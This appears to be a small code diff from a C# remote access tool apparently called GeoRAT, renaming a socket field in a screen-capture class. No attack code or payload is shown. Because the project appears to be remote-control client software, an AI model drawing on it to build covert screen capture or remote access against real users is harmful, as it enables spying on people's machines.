@@ -14,7 +14,7 @@ namespace GeoRAT.Client.Network.RemoteDesktop
 {
     class DesktopSharing
     {
-        private Socket senderSocket;
+        private Socket _senderSocket;
        
         private static Bitmap CaptureScreen()
         {
